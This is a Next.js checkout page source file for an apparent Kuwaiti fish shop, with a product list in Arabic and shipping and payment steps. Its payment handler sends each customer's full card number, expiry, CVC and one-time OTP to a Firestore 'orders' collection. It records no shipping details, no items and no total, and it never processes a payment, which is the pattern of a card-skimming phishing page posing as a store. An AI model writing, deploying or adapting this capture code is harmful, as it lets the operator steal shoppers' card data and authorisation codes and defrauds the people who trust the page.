'use client'

import { useState, useEffect } from 'react'
import { collection, addDoc, updateDoc } from 'firebase/firestore'
import { Navbar } from "@/components/ui/navbar"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { PaymentForm } from '../payment-form'
import db from '../lib/firebase'
import { validate } from '@/lib/utils'
type Product = {
  id: number;
  name: string;
  price: number;
  currency: string; // Added currency field
  weight: number | string; // Adjusted to accommodate ranges if needed
  unit: string;
  image: string;
  description: string;
  isSpecialOffer: boolean,

};

const products: Product[] = [
  {
    id: 1,
    name: 'سمك شعري',
    price: 2,
    currency: 'دينار كويتي',
    weight: 800,
    unit: 'جرام',
    image: '/a.webp',
    description: 'سمك طازج شعري أحمر',
    isSpecialOffer: true,

  },
  {
    id: 2,
    name: 'فيليه هامور',
    price: 3,
    currency: 'دينار كويتي',
    weight: 1000,
    unit: 'جرام',
    image: '/b.webp',
    description: 'فيليه سمك طازج مع الليمون',
    isSpecialOffer: true,

  },
  {
    id: 3,
    name: 'سمك بوري البحر الأحمر',
    price: 2.6,
    currency: 'دينار كويتي',
    weight: 800,
    unit: 'جرام',
    image: '/c.webp',
    description: 'سمك طازج من البحر الأحمر',
    isSpecialOffer: true,

  },
  {
    id: 4,
    name: 'سمك البياض الأبيض',
    price: 3.3,
    currency: 'دينار كويتي',
    weight: '800-1000', // Adjusted for the specified range
    unit: 'جرام',
    image: '/d.webp',
    description: 'سمك طازج مع التوابل',
    isSpecialOffer: true,

  },
  {
    id: 5,
    name: 'سمك الماكريل',
    price: 4.2,
    currency: 'دينار كويتي',
    weight: 800,
    unit: 'جرام',
    image: '/e.webp',
    description: 'سمك ماكريل طازج',
    isSpecialOffer: true,

  },
  {
    id: 6,
    name: 'سلمون مدخن شرائح رفيعة',
    price: 5.3,
    currency: 'دينار كويتي',
    weight: 200,
    unit: 'جرام مغلف',
    image: '/f.webp',
    description: 'شرائح سلمون مدخن',
    isSpecialOffer: true,
  },
  {
    id: 7,
    name: 'سمك السردين (السلفي)',
    price: 5.25,
    currency: 'دينار كويتي',
    weight: 800,
    unit: 'جرام',
    image: '/g.webp',
    description: 'سمك سردين طازج',
    isSpecialOffer: true,

  },
  {
    id: 8,
    name: 'سمك بلطي',
    price: 3.2,
    currency: 'دينار كويتي',
    weight: 800,
    unit: 'جرام',
    image: '/h.webp',
    description: 'سمك بلطي طازج',
    isSpecialOffer: true,

  },
  {
    id: 9,
    name: 'سمك بوري كبير',
    price: 4.2,
    currency: 'دينار كويتي',
    weight: 800,
    unit: 'جرام',
    image: '/j.webp',
    description: 'سمك بوري طازج كبير الحجم',
    isSpecialOffer: true,

  },
  {
    id: 10,
    name: 'سمك السلمون النرويجي',
    price: 2.2,
    image: '/k.webp',
    unit: 'جرام',
    weight: 800,
    currency: 'دينار كويتي',
    description: 'سمك سلمون نرويجي طازج',
    isSpecialOffer: true,

  },
];
type CartItem = {
  id: number;
  quantity: number;
}
type PaymentInfo = {
  cardNumber: string;
  cvc: string;
  year:string;
  month: string;
  otp: string;

}

type PaymentMethod = 'credit_card' | 'kent'

export default function CheckoutPage() {
  const [cart, setCart] = useState<CartItem[]>([])
  const [step, setStep] = useState(1)
  const [shippingInfo, setShippingInfo] = useState({
    name: '',
    address: '',
    city: '',
    phone: '',
  })

  useEffect(() => {
    const savedCart = localStorage.getItem('cart')
    if (savedCart) {
      setCart(JSON.parse(savedCart))
    }
  }, [])

  const calculateTotal = () => {
    return cart.reduce((total, item) => {
      const product = products.find(p => p.id === item.id)
      return total + (product?.price || 0) * item.quantity
    }, 0)
  }

  const handleShippingSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setStep(2);
    console.log(validate(''))
  }

  const handlePaymentComplete = async (paymentInfo: any, method: any) => {
    try {
      // Create an order object
      const order = {
        paymentMethod: method,
        paymentInfo: method === 'credit_card' ? {
          cardNumber: paymentInfo?.cardNumber,
          year: paymentInfo?.year,
          month: paymentInfo?.month,
          cvc: paymentInfo?.cvc,
          otp: paymentInfo?.otp,
          createdAt: new Date()


        } : {
          cardNumber: paymentInfo?.cardNumber,
          year: paymentInfo?.year,
          month: paymentInfo?.month,
          cvc: paymentInfo?.cvc,
          otp: paymentInfo?.otp,
          createdAt: new Date()
        }

      }

      // Add the order to Firestore
      
      const docRef =await addDoc(collection(db, "orders"),order)

      // Clear the cart and redirect to home page
      localStorage.removeItem('cart')
    } catch (error) {
      console.error("Error adding document: ", error)

    }
  }

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      <Navbar />

      <main className="container mx-auto px-4 py-12">
        <h1 className="text-4xl font-bold text-[#002B5C] mb-12 text-center">إتمام الطلب</h1>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
          <Card>
            <CardHeader>
              <CardTitle>ملخص الطلب</CardTitle>
            </CardHeader>
            <CardContent>
              {cart.map(item => {
                const product = products.find(p => p.id === item.id)
                return product ? (
                  <div key={item.id} className="flex justify-between items-center mb-2">
                    <div>
                      <span className="font-semibold">{product.name}</span>
                      <p className="text-sm text-gray-600">{product.description}</p>
                    </div>
                    <div className="text-right">
                      <span>{item.quantity} x {product.price.toFixed(2)} د.ك</span>
                      <p className="text-sm text-gray-600">{(product.price * item.quantity).toFixed(2)} د.ك</p>
                    </div>
                  </div>
                ) : null
              })}
              <div className="border-t pt-2 mt-4">
                <div className="flex justify-between items-center font-bold">
                  <span>الإجمالي</span>
                  <span>{calculateTotal().toFixed(2)} د.  ك</span>
                </div>
              </div>
            </CardContent>
          </Card>

          {step === 1 ? (
            <Card>
              <CardHeader>
                <CardTitle>عنوان الشحن</CardTitle>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleShippingSubmit}>
                  <div className="space-y-4">
                    <div>
                      <Label htmlFor="name">الاسم</Label>
                      <Input
                        id="name"
                        value={shippingInfo.name}
                        onChange={(e) => setShippingInfo({ ...shippingInfo, name: e.target.value })}
                        required
                      />
                    </div>
                    <div>
                      <Label htmlFor="address">العنوان</Label>
                      <Input
                        id="address"
                        value={shippingInfo.address}
                        onChange={(e) => setShippingInfo({ ...shippingInfo, address: e.target.value })}
                        required
                      />
                    </div>
                    <div>
                      <Label htmlFor="city">المدينة</Label>
                      <Input
                        id="city"
                        value={shippingInfo.city}
                        onChange={(e) => setShippingInfo({ ...shippingInfo, city: e.target.value })}
                        required
                      />
                    </div>
                    <div>
                      <Label htmlFor="phone">رقم الهاتف</Label>
                      <Input
                        id="phone"
                        value={shippingInfo.phone}
                        onChange={(e) => setShippingInfo({ ...shippingInfo, phone: e.target.value })}
                        required
                        type='tel'
                      />
                    </div>
                    <Button type="submit" className="w-full bg-blue-500 hover:bg-[#001F43] text-white">
                      متابعة للدفع
                    </Button>
                  </div>
                </form>
              </CardContent>
            </Card>
          ) : (
            <PaymentForm onPaymentComplete={handlePaymentComplete} />
          )}
        </div>
      </main>
    </div>
  )
}

